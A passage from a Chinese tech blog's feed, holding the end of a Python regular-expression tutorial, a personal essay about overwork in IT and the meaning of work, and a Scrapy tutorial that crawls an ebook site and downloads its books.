class="line"><span class="number">4002692</span></span><br></pre></td></tr></table></figure><p>在这可以看出，match()因为是起始位置匹配所以QQ号4002692没有匹配上，而search()它是扫描整个字符串找到第一个匹配成功的就返回了，实际上在这个例子中还有个3641250的QQ号。如果要找到所有的匹配就要用到re.findall()方法了。</p><ul><li><strong>使用findall()所有匹配查找</strong><br>findall()在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果有多个匹配模式，则返回元组列表，如果没有找到匹配的，则返回空列表。<br>注意： match 和 search 是匹配一次 findall 匹配所有。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result_qq_findall=re.findall(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_findall)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'4002692'</span>, <span class="string">'3641250'</span>]</span><br></pre></td></tr></table></figure><p>可以看到通过re.findall()方法匹配到了两个QQ号。</p><ul><li><strong>使用sub()匹配替换</strong><br>在做数据处理的时候，经常碰到的场景是找到某个匹配项，替换成一个新的字符串。这时就可以用到re.sub()进行匹配替换了。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">email_pattern=<span class="string">'[a-zA-Z0-9_\.]+@[qq|163|189]+[\.a-zA-Z]+'</span></span><br><span class="line">email_str1=<span class="string">'我的email是：xiejava@qq.com、xiejava1018@163.com、xiejava@189.com、xiejava@sohu.com'</span></span><br><span class="line">result_email_findall=re.findall(email_pattern,email_str1)</span><br><span class="line">print(result_email_findall)</span><br><span class="line">email_str2=re.sub(<span class="string">'[a-zA-Z0-9_\.]+@'</span>,<span class="string">'****@'</span>,email_str1)</span><br><span class="line">print(email_str2)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'xiejava@qq.com'</span>, <span class="string">'xiejava1018@163.com'</span>, <span class="string">'xiejava@189.com'</span>]</span><br><span class="line">我的email是：****@qq.com、****@<span class="number">163.</span>com、****@<span class="number">189.</span>com、****@sohu.com</span><br></pre></td></tr></table></figure><p>在这里可以看到，我们通过re.findall()匹配到了qq、163、189的邮箱。通过re.sub()将所有的邮箱的账号匹配后替换成了****进行脱敏处理。</p><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：</p><table><thead><tr><th>修饰符</th><th>描述</th></tr></thead><tbody><tr><td>re.I</td><td>使匹配对大小写不敏感</td></tr><tr><td>re.L</td><td>做本地化识别（locale-aware）匹配</td></tr><tr><td>re.M</td><td>多行匹配，影响 ^ 和 $</td></tr><tr><td>re.S</td><td>使 . 匹配包括换行在内的所有字符</td></tr><tr><td>re.U</td><td>根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td></tr><tr><td>re.X</td><td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td></tr></tbody></table><p>使用实例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">match_pattern=<span class="string">'xiejava'</span></span><br><span class="line"></span><br><span class="line">account_str1=<span class="string">'XieJava is xiejava'</span></span><br><span class="line">result1=re.match(match_pattern,account_str1)</span><br><span class="line">print(result1)</span><br><span class="line">result2=re.match(match_pattern,account_str1,re.I)</span><br><span class="line">print(result2)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">7</span>), match=<span class="string">'XieJava'</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看到在没有指定re.I的时候没有匹配到XieJava，指定re.I后使匹配对大小写不敏感，可以匹配到Xiejava</p><h2 id="三、正则表达式的应用"><a href="#三、正则表达式的应用" class="headerlink" title="三、正则表达式的应用"></a>三、正则表达式的应用</h2><p>给定一个正则表达式和另一个字符串，我们可以达到如下的目的：</p><ol><li><p>判断给定的字符串是否符合正则表达式的过滤逻辑（称作“匹配”）<br>应用场景为格式效验，如身份证、Email、手机号码的数据效验等。</p></li><li><p>可以通过正则表达式，从字符串中获取我们想要的特定部分<br>应用场景如：爬虫程序爬取数据时进行信息的提取，从文本中提取特定的部分。</p></li><li><p>可以通过正则表示式进行查找替换，将字符串中符合匹配条件的项替换成特定的字符<br>应用场景如：机器学习中的数据清洗整理，将某些数据进行查找替换等。</p></li></ol><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我们在做机器学习项目的时候，很大部分的精力都在做数据的整理，不管是用爬虫在网上爬取数据还是对已有的数据进行整理，往往需要对一些特定的字符串进行处理，正则表达式则是进行数据处理的利器。&lt;/p&gt;
&lt;h2 id=&quot;一、什么是正则表达式&quot;&gt;&lt;a href=&quot;#一、什么是正则表达式&quot;
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>连续加班几个月，放假还要带电脑，我在思考工作的意义</title>
    <link href="https://xiejava.gitee.io/posts/3cd9fb5d/"/>
    <id>https://xiejava.gitee.io/posts/3cd9fb5d/</id>
    <published>2023-09-30T03:06:45.000Z</published>
    <updated>2023-09-30T03:31:11.414Z</updated>
    
    <content type="html"><![CDATA[<p>对于了解IT这个行业的人来说，这个行业的内卷程度超乎了大家的想像，工作真的很累，加班已经成为整个行业的标签。不管是去哪里笔记本电脑都得随身带，就像随时待命的特种兵，接到命令随时马上要展开战斗。有的时候在系统出事或者需求比较紧急的时候，无论哪里都会成为工作场所，可能旅游景点、可能是商场、可能是高铁地铁上、也有可能是路边……</p><p>在线系统出bug了他们就是救火员！想必很多人都经历过系统上线后匆忙处理bug，这种时候，就不分周末还是工作日了，更不管白天还是黑夜干就对了！有网友分享了这“经典”的一幕，一天晚上9点多，北京地铁某号线上，这位网友刚下站就看见一个小伙子蹲坐在一个隐蔽的角落，旁边地上放着双肩包，屏幕亮着，小伙正在专心地敲代码。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230930/%E7%A8%8B%E5%BA%8F%E5%91%98%E8%B7%AF%E8%BE%B9%E6%95%B2%E4%BB%A3%E7%A0%81%E6%94%B9bug.png" alt="程序员路边敲代码改bug"></p><p>作为IT从业者深刻感受到行业之卷，而对于运营商中搞网络安全的从业人员来说那更是“卷王之王”。各种实战演练活动、各种重保活动、安全运营监控值守、各种突发事件应急处置等。连续加班了好几个月，到了国庆假期还得要带上笔记本电脑，生怕有电话进来，基本上没有什么生活质量可言。这段时间，每天早上起床的第一件事就是问自己“<strong>这就是我想要的生活吗？</strong>”，为此我在思考和寻找工作的意义。</p><p>人的本性是趋利避害的，工作这事，本身是违背人本性的——无论什么工作，只要是投入劳力与时间换取物质资料，但在这个时代，工作又是人类最高效的自我满足手段——物质和精神，都是如此。</p><p>在《商业模式新生代-个人篇》介绍了工作的四种意义：</p><ul><li><p>工作是谋生手段<br>它意味着为了收入而工作，不涉及多少个人因素或满足感。工作即一种实用性活动，就是说完成某事的主要目的是为了得到另一件事。当然作为谋生手段的工作也能产生宝贵的技能和满足感，但其主要目的还是为工作者提供生存基础以追求生活中其他方面的意识。</p></li><li><p>工作是发展方向<br>将工作视为职业，这种观点的前提是工作者的动力源自对成功、成就和身份地位的渴望。此类工作者对工作的态度并不是热情眷恋，而是强调努力工作对自我的回馈，对职业型工作者来说，工作是一种创造、定义、表达、证明和美化自我的方式。将工作视为发展方向是实现人生意义和获得满足感的一个重要来源。</p></li><li><p>工作是使命召唤<br>“天职”这个词源自“天将降大任于斯人也”这一理念。这种“天意”可以是外在动力，如上帝的旨意或社区的需要；也可以是内在动力，如需要向世人展现的天赋使命。这种工作强调的是“个人的义务、责任或使命”。在那个激情燃烧的时代，为社会主义事业奋斗终生是我们的使命召唤；在百年未有之大变局的新时代，突破高科技技术封锁，实现中华民族的伟大复兴是我们的使命召唤。</p></li><li><p>工作是自我实现<br>它一方面体现了工作高度强调兴趣驱动的特征，另一方面淡化了咄咄逼人的“天命”特征。追求自我实现的工作者会选择不同寻常的职业道路，这些选择强调的是个人兴趣而非经济回报或名声威望。这种思考方式也是获得人生意义的一个重要来源。视工作为“自我实现”的人相对来说工作生活更为平衡，他们可以在工作中实现更多的人生意义，同时也不会牺牲家庭欢乐和其他方面的兴趣。</p></li></ul><p><strong>工作对不同的人来说具有不同的意义，工作的意义在很大程度上决定着“我是谁”这个命题的答案。</strong></p><ul><li><p>工作只是生活的手段，享受生活才是目的<br>工作是为了更好的生活，它的本质是交换，我们付出时间、经验，换取一部分我们想要的生活自由。我们已经很幸运，大部分的人都能有一份安稳的工作作为谋生手段。不要在谋生的地方找意义，生活才是实现意义的地方。</p></li><li><p>工作之外的你，才是真正不可替代的<br>我们这一生扮演的很多角色都是不可替代的，贴心的朋友、孝顺的子女、操心的家长。唯独工作是可以被替代的，如果你不干这些工作，依然有会有人干。与其把时间都投入到工作中内卷、焦虑、失眠，不如多花时间陪伴家人和朋友。 下班后该玩儿就玩儿，就陪家人就陪家人，把精力分散，而不是用下班时间去焦虑工作，还把这种内耗带到家里。你去运动、去做饭、去旅游、去亲近自然、去看一看花开日落、去体会一下风土人情。</p></li></ul><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;对于了解IT这个行业的人来说，这个行业的内卷程度超乎了大家的想像，工作真的很累，加班已经成为整个行业的标签。不管是去哪里笔记本电脑都得随身带，就像随时待命的特种兵，接到命令随时马上要展开战斗。有的时候在系统出事或者需求比较紧急的时候，无论哪里都会成为工作场所，可能旅游景点、
      
    
    </summary>
    
    
      <category term="人生" scheme="https://xiejava.gitee.io/categories/%E4%BA%BA%E7%94%9F/"/>
    
    
      <category term="自我管理" scheme="https://xiejava.gitee.io/tags/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Scrapy爬虫框架实战</title>
    <link href="https://xiejava.gitee.io/posts/dfc313ee/"/>
    <id>https://xiejava.gitee.io/posts/dfc313ee/</id>
    <published>2023-09-12T15:00:02.000Z</published>
    <updated>2023-09-12T15:15:42.188Z</updated>
    
    <content type="html"><![CDATA[<p>Python实现爬虫是很容易的，一般来说就是获取目标网站的页面，对目标页面的分析、解析、识别，提取有用的信息，然后该入库的入库，该下载的下载。以前写过一篇文章<a href="http://xiejava.ishareread.com/posts/eab21fe5/" target="_blank" rel="noopener">《Python爬虫获取电子书资源实战》</a>，以一个电子书的网站为例来实现python爬虫获取电子书资源。爬取整站的电子书资源，按目录保存到本地，并形成索引文件方便查找。这次介绍通过Scrapy爬虫框架来实现同样的功能。</p><h2 id="一、Scrapy简介"><a href="#一、Scrapy简介" class="headerlink" title="一、Scrapy简介"></a>一、Scrapy简介</h2><p>Scrapy 是用 Python 实现的一个为了爬取网站数据、提取结构性数据而编写的应用框架。<br>Scrapy 常应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。<br>通常我们可以很简单的通过 Scrapy 框架实现一个爬虫，抓取指定网站的内容或图片。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/1-scrapy%E6%9E%B6%E6%9E%84%E5%9B%BE.png" alt="Scrapy爬虫框架"></p><ul><li>Scrapy Engine(引擎)：负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。</li><li>Scheduler(调度器)：它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。</li><li>Downloader(下载器）：负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理，</li><li>Spider（爬虫）：它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器).</li><li>Item Pipeline(管道)：它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。</li><li>Downloader Middlewares（下载中间件）：可以当作是一个可以自定义扩展下载功能的组件。</li><li>Spider Middlewares（Spider中间件）：可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests）</li></ul><h2 id="二、Scrapy实战"><a href="#二、Scrapy实战" class="headerlink" title="二、Scrapy实战"></a>二、Scrapy实战</h2><p>虽然用python写一个爬虫也不是很费事，但是有了Scrapy以后让你实现爬虫更简单，更加通用，现在我们还是以《Python爬虫获取电子书资源实战》中的例子，爬取目标网站kgbook.com。也可以对比看一下通过Scrapy爬虫框架实现相同的功能有多么的方便。</p><h3 id="1、Scrapy安装"><a href="#1、Scrapy安装" class="headerlink" title="1、Scrapy安装"></a>1、Scrapy安装</h3><p>首先通过 pip 安装 Scrapy 框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scrapy</span><br></pre></td></tr></table></figure><h3 id="2、创建Scrapy项目工程"><a href="#2、创建Scrapy项目工程" class="headerlink" title="2、创建Scrapy项目工程"></a>2、创建Scrapy项目工程</h3><p>创建getbooks的项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject getbooks</span><br></pre></td></tr></table></figure><p>创建一个getkgbook的爬虫，目标网站kgbook.com</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider getkgbook kgbook.com</span><br></pre></td></tr></table></figure><p>项目的结构如下图所示</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/2-scrapy%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="Scrapy项目目录结构"></p><h3 id="3、实现Scrapy的爬虫代码"><a href="#3、实现Scrapy的爬虫代码" class="headerlink" title="3、实现Scrapy的爬虫代码"></a>3、实现Scrapy的爬虫代码</h3><h4 id="爬数据"><a href="#爬数据" class="headerlink" title="爬数据"></a>爬数据</h4><p>主要的爬虫逻辑实现代码都在getkgbook.py中，在这里实现目录的爬取、翻页、进入到详情页，并解析详情页的数据。<br>getkgbook.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> getbooks.items <span class="keyword">import</span> KgbookItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetkgbookSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"getkgbook"</span>  <span class="comment">#爬虫的名称</span></span><br><span class="line">    allowed_domains = [<span class="string">"kgbook.com"</span>]   <span class="comment">#爬取的网站</span></span><br><span class="line">    start_urls = [<span class="string">"https://kgbook.com"</span>]  <span class="comment">#爬取的首页</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        categorys = response.xpath(<span class="string">'//div[@id="category"]/div/ul/li/a'</span>)</span><br><span class="line">        <span class="keyword">for</span> category <span class="keyword">in</span> categorys:</span><br><span class="line">            category_url = category.xpath(<span class="string">'./@href'</span>).extract_first()</span><br><span class="line">            url=response.urljoin(category_url)</span><br><span class="line">            <span class="comment">#爬取进入到目录页</span></span><br><span class="line">            <span class="keyword">yield</span> response.follow(url, self.parse_booklist) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#解析目录页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_booklist</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        book_list_select=response.css(<span class="string">'.channel-item h3.list-title a'</span>)</span><br><span class="line">        <span class="comment">#获取书籍列表</span></span><br><span class="line">        <span class="keyword">for</span> book_info_select <span class="keyword">in</span> book_list_select:</span><br><span class="line">            book_name=book_info_select.css(<span class="string">'::text'</span>).extract_first()</span><br><span class="line">            book_detail_url=book_info_select.css(<span class="string">'::attr(href)'</span>).extract_first()</span><br><span class="line">            book_detail_url=response.urljoin(book_detail_url)</span><br><span class="line">            print(book_name,book_detail_url)</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=book_detail_url, callback=self.pase_bookdetail)</span><br><span class="line">        <span class="comment">#翻页</span></span><br><span class="line">        nextpage_url = response.xpath(<span class="string">'//div[@class="pagenavi"]/a[contains(text(), "下一页")]/@href'</span>).extract_first()</span><br><span class="line">        <span class="keyword">if</span> nextpage_url:</span><br><span class="line">            <span class="keyword">yield</span> response.follow(nextpage_url, self.parse_booklist)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#解析详情页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pase_bookdetail</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        navegate=response.xpath(<span class="string">'//nav[@id="location"]/a'</span>)</span><br><span class="line">        <span class="keyword">if</span> len(navegate)&gt;<span class="number">1</span>:</span><br><span class="line">            book_category=navegate[<span class="number">1</span>].xpath(<span class="string">'./text()'</span>).extract_first()</span><br><span class="line">        book_name=response.css(<span class="string">'.news_title::text'</span>).extract_first()</span><br><span class="line">        book_author=response.xpath(<span class="string">'//div[@id="news_details"]/ul/li[contains(text(),"作者")]/text()'</span>).extract_first()</span><br><span class="line">        pattern=re.compile(<span class="string">'mobi|epub|azw3|pdf'</span>,re.I) <span class="comment">#解析书籍的类型</span></span><br><span class="line">        book_download_urls=response.xpath(<span class="string">'//div[@id="introduction"]/a[@class="button"]'</span>)</span><br><span class="line">        <span class="keyword">for</span> book_download_urlinfo <span class="keyword">in</span> book_download_urls:</span><br><span class="line">            book_type=book_download_urlinfo.re(pattern)</span><br><span class="line">            <span class="keyword">if</span> book_type:</span><br><span class="line">                book_download_url=book_download_urlinfo.xpath(<span class="string">'./@href'</span>).extract_first()</span><br><span class="line">                <span class="comment">#获取要下载的书籍的名称、作者、要保存的路径、下载地址</span></span><br><span class="line">                item=KgbookItem()</span><br><span class="line">                item[<span class="string">'book_name'</span>]=book_name</span><br><span class="line">                item[<span class="string">'book_author'</span>]=book_author</span><br><span class="line">                item[<span class="string">'book_file'</span>]=os.path.join(book_category,book_name+<span class="string">"."</span>+str(book_type[<span class="number">0</span>]).lower())</span><br><span class="line">                item[<span class="string">'book_url'</span>]=book_download_url</span><br><span class="line">                print(book_name,book_author,book_download_url,item[<span class="string">'book_file'</span>])</span><br><span class="line">                <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p>在这里我们通过xpath解析器和css解析器来解析获取网页中的有用的信息。如提取a 标签的href的信息 ，提取书籍的名称、作者、下载链接等信息。</p><h4 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h4><p>item.py<br>在item.py中定义了KgbookItem类，Item 定义结构化数据字段，用来保存爬取到的数据，有点像 Python 中的 dict，但是提供了一些额外的保护减少错误。在这里定义了book_name、book_author、book_file、book_url这些信息都会通过爬虫提取后保存用来输出到文件或数据库等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KgbookItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    book_name=scrapy.Field()</span><br><span class="line">    book_author=scrapy.Field()</span><br><span class="line">    book_file=scrapy.Field()</span><br><span class="line">    book_url=scrapy.Field()</span><br></pre></td></tr></table></figure><h4 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h4><p>通过pipelines定义文件下载的管道类<br>pipelines.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> item, Request</span><br><span class="line"><span class="keyword">from</span> scrapy.pipelines.files <span class="keyword">import</span> FilesPipeline</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KgBookFilePipeline</span><span class="params">(FilesPipeline)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_media_requests</span><span class="params">(self,item,info)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> Request(item[<span class="string">'book_url'</span>],meta=&#123;<span class="string">'book_file'</span>:item[<span class="string">'book_file'</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file_path</span><span class="params">(self, request, response=None, info=None)</span>:</span></span><br><span class="line">        file_name=request.meta.get(<span class="string">'book_file'</span>)</span><br><span class="line">        <span class="keyword">return</span> file_name</span><br></pre></td></tr></table></figure><p>这里实际上只做两件事，一是get_media_requests下载文件，二是组织文件要保存的路径。会通过相应的下载中间件将文件下载并保存在需要保存的目录。这里我们规划的保存目录是书籍目录\书名.类型。<br>还需要在settings.py中定义下载后保存的路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存书籍的路径</span></span><br><span class="line">FILES_STORE=<span class="string">'./books'</span></span><br><span class="line"><span class="comment"># 定义自定义下载的管道</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">"getbooks.pipelines.KgBookFilePipeline"</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入以下定义，强制爬取、下载，并忽略301,302重定向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">MEDIA_ALLOW_REDIRECTS = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">HTTPERROR_ALLOWED_CODES = [<span class="number">301</span>,<span class="number">302</span>]</span><br></pre></td></tr></table></figure><p>至此，就通过Scrapy爬虫框架实现了一个爬虫。<br>运行效果<br>执行 <code>scrapy crawl getkgbook -o books.json</code><br>可以看到控制台打印出来的日志，爬虫开始默默的勤勤恳恳的爬取了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/3-scrapy%E7%88%AC%E5%8F%96%E6%97%A5%E5%BF%97.png" alt="爬取日志"></p><p>爬取的结果保存到了books.json中<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/4-books.json.png" alt="books.json"></p><p>要下载的书籍也保存到了books下相应的目录下了<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230912/5-%E4%BF%9D%E5%AD%98%E7%9A%84%E6%96%87%E4%BB%B6.png" alt="保存的文件"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>有可能在文件下载的时候并没有把文件下载下来，原因是文件下载路径有重定向。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.core.engine</span>] DEBUG: Crawled (<span class="number">301</span>) &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">471</span>&amp;pathid=<span class="number">0</span>&gt; (referer: None)</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.pipelines.files</span>] WARNING: File (code: <span class="number">301</span>): Error downloading file from &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">471</span>&amp;pathid=<span class="number">0</span>&gt; referred <span class="keyword">in</span> &lt;None&gt;</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.core.engine</span>] DEBUG: Crawled (<span class="number">301</span>) &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">4742</span>&amp;pathid=<span class="number">0</span>&gt; (referer: None)</span><br><span class="line"><span class="number">2023</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">38</span> [<span class="type">scrapy.pipelines.files</span>] WARNING: File (code: <span class="number">301</span>): Error downloading file from &lt;GET https://kgbook.com/e/DownSys/GetDown?classid=<span class="number">24</span>&amp;id=<span class="number">4742</span>&amp;pathid=<span class="number">0</span>&gt; referred <span class="keyword">in</span> &lt;None&gt;</span><br></pre></td></tr></table></figure><p>需要在settings.py中加入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MEDIA_ALLOW_REDIRECTS = <span class="literal">True</span>  <span class="comment">#直接下载</span></span><br><span class="line"></span><br><span class="line">HTTPERROR_ALLOWED_CODES = [<span class="number">301</span>,<span class="number">302</span>]  <span class="comment">#忽略重定向的报错信息</span></span><br></pre></td></tr></table></figure><p>现在我们通过一个Scrapy爬虫框架实例实现了网站的爬取，重代码量上看比python直接写少了很多，通用性也更强了。通过管道不仅仅可以将数据保持至json还可以保存到Excel、数据库等。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p> <center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
